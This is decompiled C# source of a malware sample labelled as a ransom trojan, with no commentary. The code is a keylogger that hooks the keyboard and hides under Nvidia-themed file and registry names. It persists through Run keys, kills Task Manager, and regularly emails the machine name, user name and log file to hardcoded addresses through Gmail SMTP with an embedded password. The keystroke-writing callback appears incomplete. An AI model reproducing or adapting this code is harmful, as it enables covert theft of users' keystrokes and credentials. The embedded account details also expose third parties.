// Decompiled with JetBrains decompiler
// Type: project.Program
// Assembly: project, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4BEE756E-70D1-479B-89E4-4EDAF80D94DA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.ajha-4cac4da63e357b7db0076cab7724138471e4a3355e5f7f749ca77b96f334c157.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;

namespace project
{
  internal class Program
  {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 256;
    private static Program.LowLevelKeyboardProc _proc = new Program.LowLevelKeyboardProc(Program.HookCallback);
    private static IntPtr _hookID = IntPtr.Zero;
    public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvidia.log");
    public static byte caps = 0;
    public static byte shift = 0;
    public static byte failed = 0;
    public static byte counter = 0;

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(
      int idHook,
      Program.LowLevelKeyboardProc lpfn,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(
      IntPtr hhk,
      int nCode,
      IntPtr wParam,
      IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void Main()
    {
      if (Program.failed == (byte) 0)
        System.IO.File.WriteAllText(Program.path, "");
      Program._hookID = Program.SetHook(Program._proc);
      Program.startup();
      System.Timers.Timer timer = new System.Timers.Timer();
      timer.Elapsed += new ElapsedEventHandler(Program.OnTimedEvent);
      timer.AutoReset = true;
      timer.Interval = 600000.0;
      timer.Start();
      Application.Run();
      GC.KeepAlive((object) timer);
      Program.UnhookWindowsHookEx(Program._hookID);
    }

    public static void startup()
    {
      string str1 = Application.ExecutablePath.ToString();
      string str2 = str1;
      string destFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvdisp.exe");
      try
      {
        System.IO.File.Copy(str1, destFileName, false);
        str1 = destFileName;
      }
      catch
      {
      }
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        if (registryKey.GetValue("Nvidia driver") == null)
          registryKey.SetValue("Nvidia driver", (object) destFileName);
        registryKey.Close();
      }
      catch
      {
      }
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        if (registryKey.GetValue("Nvidia driver") == null)
          registryKey.SetValue("Nvidia driver", (object) str1);
        registryKey.Close();
      }
      catch
      {
      }
      if (!(str1 != str2))
        return;
      Process.Start(str1);
      Environment.Exit(0);
    }

    public static void OnTimedEvent(object source, EventArgs e)
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.MainWindowTitle.Contains("Taskmgr.exe"))
          process.Kill();
      }
      ++Program.counter;
      Program.Mail("chaachasaab@hotmail.com", "imran.nazir11003@gmail.com", "pakistan00");
      Program.Mail("shah_sahab_jhoolalal@hotmail.co.uk", "imran.nazir11004@gmail.com", "pakistan00");
    }

    public static void Mail(string x, string y, string z)
    {
      MailMessage message = new MailMessage();
      message.To.Add(x);
      message.From = new MailAddress(y);
      message.Subject = Environment.MachineName + "--" + (object) Program.counter + "--" + Environment.UserName;
      message.SubjectEncoding = Encoding.UTF8;
      if (Program.counter == (byte) 0)
        message.Body = "Welcome 2 Pan Yaki...." + Environment.MachineName + "----" + Environment.UserName + "---- is online";
      else
        message.Body = "Welcome 2 Pan Yaki....";
      message.BodyEncoding = Encoding.UTF8;
      message.IsBodyHtml = false;
      message.Priority = MailPriority.Normal;
      SmtpClient smtpClient = new SmtpClient();
      smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(y, z);
      smtpClient.Port = 587;
      smtpClient.Host = "smtp.gmail.com";
      smtpClient.EnableSsl = true;
      Attachment attachment = new Attachment(Program.path);
      if (Program.counter != (byte) 0)
        message.Attachments.Add(attachment);
      try
      {
        smtpClient.Send(message);
      }
      catch
      {
        attachment.Dispose();
      }
      attachment.Dispose();
    }

    private static IntPtr SetHook(Program.LowLevelKeyboardProc proc)
    {
      using (Process currentProcess = Process.GetCurrentProcess())
      {
        using (ProcessModule mainModule = currentProcess.MainModule)
          return Program.SetWindowsHookEx(13, proc, Program.GetModuleHandle(mainModule.ModuleName), 0U);
      }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
      if (nCode >= 0 && wParam == (IntPtr) 256)
      {
        StreamWriter streamWriter = System.IO.File.AppendText(Program.path);
        if (Keys.Shift == Control.ModifierKeys)
          Program.shift = (byte) 1;
        Program.shift = (byte) 0;
        streamWriter.Close();
      }
      return Program.CallNextHookEx(Program._hookID, nCode, wParam, lParam);
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  }
}
